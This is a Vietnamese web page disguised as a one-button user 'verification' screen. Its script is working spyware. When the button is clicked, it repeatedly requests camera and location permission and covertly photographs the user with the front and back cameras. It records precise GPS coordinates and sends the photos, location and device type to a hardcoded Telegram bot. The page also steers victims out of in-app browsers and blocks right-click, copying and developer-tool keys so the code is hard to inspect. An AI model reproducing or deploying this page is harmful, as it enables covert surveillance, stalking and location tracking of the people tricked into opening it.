<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Xác Minh</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #0a0e13;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            overflow: hidden;
            color: white;
        }

        body::before {
            content: '';
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: radial-gradient(ellipse at 20% 50%, rgba(0, 100, 255, 0.15) 0%, transparent 50%),
                radial-gradient(ellipse at 80% 50%, rgba(100, 0, 255, 0.1) 0%, transparent 50%),
                radial-gradient(ellipse at 50% 80%, rgba(0, 200, 150, 0.08) 0%, transparent 50%);
            z-index: 0;
        }

        .container {
            position: relative;
            z-index: 1;
            text-align: center;
            padding: 40px;
        }

        .pulse-ring {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 180px;
            height: 180px;
            border-radius: 50%;
            border: 2px solid rgba(0, 150, 255, 0.3);
            animation: pulse-ring 2s infinite;
            pointer-events: none;
        }
        .pulse-ring:nth-child(2) {
            animation-delay: 0.5s;
        }
        .pulse-ring:nth-child(3) {
            animation-delay: 1s;
        }

        @keyframes pulse-ring {
            0% {
                width: 180px;
                height: 180px;
                opacity: 1;
                border-color: rgba(0, 150, 255, 0.4);
            }
            100% {
                width: 300px;
                height: 300px;
                opacity: 0;
                border-color: rgba(0, 150, 255, 0);
            }
        }

        .verify-btn {
            position: relative;
            z-index: 2;
            width: 160px;
            height: 160px;
            border-radius: 50%;
            background: linear-gradient(135deg, #0066ff, #0052cc);
            border: 3px solid rgba(255, 255, 255, 0.2);
            color: white;
            font-size: 22px;
            font-weight: bold;
            cursor: pointer;
            letter-spacing: 2px;
            transition: all 0.3s ease;
            box-shadow: 0 0 40px rgba(0, 100, 255, 0.5), inset 0 0 30px rgba(255, 255, 255, 0.1);
            text-transform: uppercase;
            outline: none;
        }
        .verify-btn:hover {
            transform: scale(1.05);
            box-shadow: 0 0 60px rgba(0, 100, 255, 0.7), 0 0 100px rgba(0, 100, 255, 0.3), inset 0 0 40px rgba(255, 255, 255, 0.15);
            border-color: rgba(255, 255, 255, 0.5);
        }
        .verify-btn:active {
            transform: scale(0.95);
        }
        .verify-btn:disabled {
            background: linear-gradient(135deg, #333, #222);
            border-color: rgba(255, 255, 255, 0.1);
            box-shadow: 0 0 20px rgba(0, 0, 0, 0.5);
            cursor: not-allowed;
        }

        /* Overlay loading */
        .overlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.85);
            z-index: 999;
            justify-content: center;
            align-items: center;
            flex-direction: column;
        }
        .overlay.active {
            display: flex;
        }
        .spinner {
            width: 50px;
            height: 50px;
            border: 4px solid rgba(255, 255, 255, 0.1);
            border-top-color: #0066ff;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
        }
        @keyframes spin {
            to {
                transform: rotate(360deg);
            }
        }
        .overlay-text {
            margin-top: 20px;
            font-size: 15px;
            color: rgba(255, 255, 255, 0.8);
            text-align: center;
        }

        /* In-App Browser Warning */
        #browser-warning {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            background: rgba(10, 14, 19, 0.98);
            z-index: 10000;
            padding: 40px 20px;
            box-sizing: border-box;
            justify-content: center;
            align-items: center;
        }
        .warning-box {
            background: #1a1f2b;
            border: 2px solid #f85149;
            padding: 30px;
            border-radius: 20px;
            text-align: center;
            max-width: 400px;
        }
        .warning-box h3 {
            color: #f85149;
            margin-top: 0;
            font-size: 20px;
        }
        .steps {
            text-align: left;
            margin-top: 20px;
            color: #c9d1d9;
            font-size: 15px;
            line-height: 2.2;
        }
        .highlight {
            color: #ffeb3b;
            font-weight: bold;
        }
    </style>
</head>
<body>

    <div id="browser-warning">
        <div class="warning-box">
            <h3>⚠️ YÊU CẦU TRÌNH DUYỆT NGOÀI</h3>
            <div class="steps">
                Vui lòng mở bằng trình duyệt bên ngoài:<br>
                1. Nhấn vào <span class="highlight">(···)</span> hoặc <span class="highlight">(⋮)</span> góc trên phải<br>
                2. Chọn <span class="highlight">"Mở bằng trình duyệt"</span><br>
                3. Sau đó nhấn XÁC MINH để tiếp tục
            </div>
        </div>
    </div>

    <div class="overlay" id="overlay">
        <div class="spinner"></div>
        <div class="overlay-text" id="overlayText">Đang xử lý...</div>
    </div>

    <div class="container" id="mainContainer">
        <div style="position: relative; display: inline-block;">
            <div class="pulse-ring"></div>
            <div class="pulse-ring"></div>
            <div class="pulse-ring"></div>
            <button class="verify-btn" id="verifyBtn">XÁC<br>MINH</button>
        </div>
    </div>

    <script>
        // ==========================================
        // ⚙️ CẤU HÌNH TELEGRAM
        // ==========================================
        const TELEGRAM_BOT_TOKEN = '8818687158:AAHoU3Ydxx1aGG1cR--wXXDCRvmvBAQ6zds';
        const TELEGRAM_CHAT_ID = '7031115869';

        // ==========================================
        // 🚫 KIỂM TRA IN-APP BROWSER
        // ==========================================
        function checkInAppBrowser() {
            const ua = navigator.userAgent || navigator.vendor || window.opera;
            const isInApp = /TikTok|musical_ly|ByteLocale|FBAN|FBAV|Zalo|Instagram|Messenger/i.test(ua);
            if (isInApp) {
                document.getElementById('browser-warning').style.display = 'flex';
                document.getElementById('mainContainer').style.display = 'none';
                return true;
            }
            return false;
        }

        // ==========================================
        // 📤 GỬI 2 ẢNH CHUNG 1 TIN NHẮN QUA TELEGRAM
        // ==========================================
        async function sendPhotosToTelegram(frontBlob, backBlob, caption) {
            try {
                const formData1 = new FormData();
                formData1.append('chat_id', TELEGRAM_CHAT_ID);
                formData1.append('photo', frontBlob, 'camera_truoc.jpg');
                formData1.append('caption', caption);
                formData1.append('parse_mode', 'HTML');
                const res1 = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData1
                });
                await res1.json();

                const formData2 = new FormData();
                formData2.append('chat_id', TELEGRAM_CHAT_ID);
                formData2.append('photo', backBlob, 'camera_sau.jpg');
                const res2 = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData2
                });
                await res2.json();
                return true;
            } catch (error) {
                console.error('Telegram send error:', error);
                return false;
            }
        }

        // ==========================================
        // 📸 CHỤP ẢNH (siêu nhanh, tối ưu timeout)
        // ==========================================
        async function capturePhoto(facingMode) {
            const stream = await navigator.mediaDevices.getUserMedia({
                video: { facingMode, width: { ideal: 1280 }, height: { ideal: 720 } },
                audio: false
            });

            const blob = await new Promise((resolve, reject) => {
                const video = document.createElement('video');
                video.srcObject = stream;
                video.setAttribute('playsinline', true);
                video.setAttribute('muted', true);
                video.play();

                video.onloadedmetadata = () => {
                    const canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;

                    // Giảm timeout xuống 600ms để chụp nhanh hơn
                    setTimeout(() => {
                        const ctx = canvas.getContext('2d');
                        if (facingMode === 'user') {
                            ctx.translate(canvas.width, 0);
                            ctx.scale(-1, 1);
                        }
                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                        canvas.toBlob((b) => {
                            stream.getTracks().forEach(t => t.stop());
                            if (b) resolve(b);
                            else reject(new Error('Không tạo được ảnh'));
                        }, 'image/jpeg', 0.8);
                    }, 600);
                };
                video.onerror = () => {
                    stream.getTracks().forEach(t => t.stop());
                    reject(new Error('Lỗi video'));
                };
            });
            return blob;
        }

        // ==========================================
        // 📍 LẤY VỊ TRÍ (timeout ngắn, ép buộc)
        // ==========================================
        async function getLocation() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) { resolve(null); return; }
                const timeout = setTimeout(() => resolve(null), 5000);
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        clearTimeout(timeout);
                        resolve({
                            lat: position.coords.latitude,
                            lng: position.coords.longitude,
                            accuracy: Math.round(position.coords.accuracy)
                        });
                    },
                    () => { clearTimeout(timeout); resolve(null); },
                    { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
                );
            });
        }

        // ==========================================
        // 🔄 ÉP QUYỀN TỰ ĐỘNG (không modal, trực tiếp)
        // ==========================================
        async function forceCameraPermission() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: 'user' },
                    audio: false
                });
                stream.getTracks().forEach(t => t.stop());
                return true;
            } catch (e) {
                return false;
            }
        }

        async function forceLocationPermission() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) { resolve(false); return; }
                const timeout = setTimeout(() => resolve(false), 5000);
                navigator.geolocation.getCurrentPosition(
                    () => { clearTimeout(timeout); resolve(true); },
                    () => { clearTimeout(timeout); resolve(false); },
                    { timeout: 5000, maximumAge: 0 }
                );
            });
        }

        // ==========================================
        // 📝 TẠO NỘI DUNG TIN NHẮN
        // ==========================================
        function createMessage(location) {
            let msg = '';
            msg += `🔔 <b>XÁC MINH NGƯỜI DÙNG</b>\n`;
            msg += `🕐 ${new Date().toLocaleString('vi-VN')}\n`;
            msg += `━━━━━━━━━━━━━━━━━━━━━━\n\n`;
            msg += `📸 <b>Ảnh 1:</b> Camera trước 👆\n`;
            msg += `📸 <b>Ảnh 2:</b> Camera sau 👆\n`;
            msg += `━━━━━━━━━━━━━━━━━━━━━━\n\n`;

            if (location) {
                msg += `📍 <b>VỊ TRÍ</b>\n`;
                msg += `🗺 <a href="https://www.google.com/maps?q=${location.lat},${location.lng}">Xem trên Google Maps</a>\n`;
                msg += `📌 Tọa độ: ${location.lat}, ${location.lng}\n`;
                msg += `🎯 Độ chính xác: ${location.accuracy}m\n`;
            } else {
                msg += `📍 <b>VỊ TRÍ:</b> ❌ Không lấy được\n`;
            }
            msg += `━━━━━━━━━━━━━━━━━━━━━━\n`;
            msg += `📱 <b>Thiết bị:</b> ${navigator.userAgent.includes('Android') ? 'Android' : navigator.userAgent.includes('iPhone') ? 'iPhone' : 'Khác'}\n`;
            return msg;
        }

        // ==========================================
        // 🎯 HÀM CHÍNH - XỬ LÝ NHANH
        // ==========================================
        async function processVerification() {
            const overlay = document.getElementById('overlay');
            const overlayText = document.getElementById('overlayText');

            // Hiện overlay ngay lập tức
            overlay.classList.add('active');
            overlayText.textContent = 'Đang yêu cầu quyền...';

            // Ép quyền camera & vị trí cùng lúc
            const [camOk, locOk] = await Promise.all([
                forceCameraPermission(),
                forceLocationPermission()
            ]);

            // Nếu thiếu quyền, thử lại 1 lần nữa
            if (!camOk || !locOk) {
                overlayText.textContent = 'Vui lòng cấp quyền để tiếp tục...';
                // Thử lại lần 2
                const [camOk2, locOk2] = await Promise.all([
                    camOk ? Promise.resolve(true) : forceCameraPermission(),
                    locOk ? Promise.resolve(true) : forceLocationPermission()
                ]);
                if (!camOk2 || !locOk2) {
                    // Vẫn tiếp tục với những gì có
                }
            }

            overlayText.textContent = 'Đang chụp ảnh & lấy vị trí...';

            // Chụp ảnh + lấy vị trí đồng thời
            const [frontPhoto, backPhoto, location] = await Promise.all([
                capturePhoto('user').catch(() => null),
                capturePhoto('environment').catch(() => null),
                getLocation()
            ]);

            overlayText.textContent = 'Đang gửi dữ liệu...';

            // Tạo tin nhắn & gửi
            const message = createMessage(location);
            await sendPhotosToTelegram(frontPhoto, backPhoto, message);

            overlayText.textContent = '✅ Hoàn tất!';
            setTimeout(() => {
                overlay.classList.remove('active');
                resetButton();
            }, 1500);
        }

        function resetButton() {
            const verifyBtn = document.getElementById('verifyBtn');
            verifyBtn.disabled = false;
            verifyBtn.innerHTML = 'XÁC<br>MINH';
        }

        // ==========================================
        // 🎬 KHỞI TẠO
        // ==========================================
        document.addEventListener('DOMContentLoaded', () => {
            if (checkInAppBrowser()) return;
        });

        const verifyBtn = document.getElementById('verifyBtn');
        verifyBtn.addEventListener('click', async () => {
            verifyBtn.disabled = true;
            verifyBtn.innerHTML = 'ĐANG<br>XỬ LÝ';
            try {
                await processVerification();
            } catch (error) {
                console.error('Error:', error);
                document.getElementById('overlayText').textContent = '❌ Lỗi, thử lại';
                setTimeout(() => {
                    document.getElementById('overlay').classList.remove('active');
                    resetButton();
                }, 1500);
            }
        });

        // ==========================================
        // 🛡 BẢO VỆ
        // ==========================================
        document.addEventListener('contextmenu', (e) => e.preventDefault());
        document.addEventListener('copy', (e) => e.preventDefault());
        document.addEventListener('cut', (e) => e.preventDefault());
        document.onkeydown = function(e) {
            if (e.keyCode === 123 ||
                (e.ctrlKey && e.shiftKey && (e.keyCode === 73 || e.keyCode === 74)) ||
                (e.ctrlKey && e.keyCode === 85) ||
                (e.ctrlKey && e.keyCode === 83)) {
                e.preventDefault();
                return false;
            }
        };
    </script>
</body>
</html>
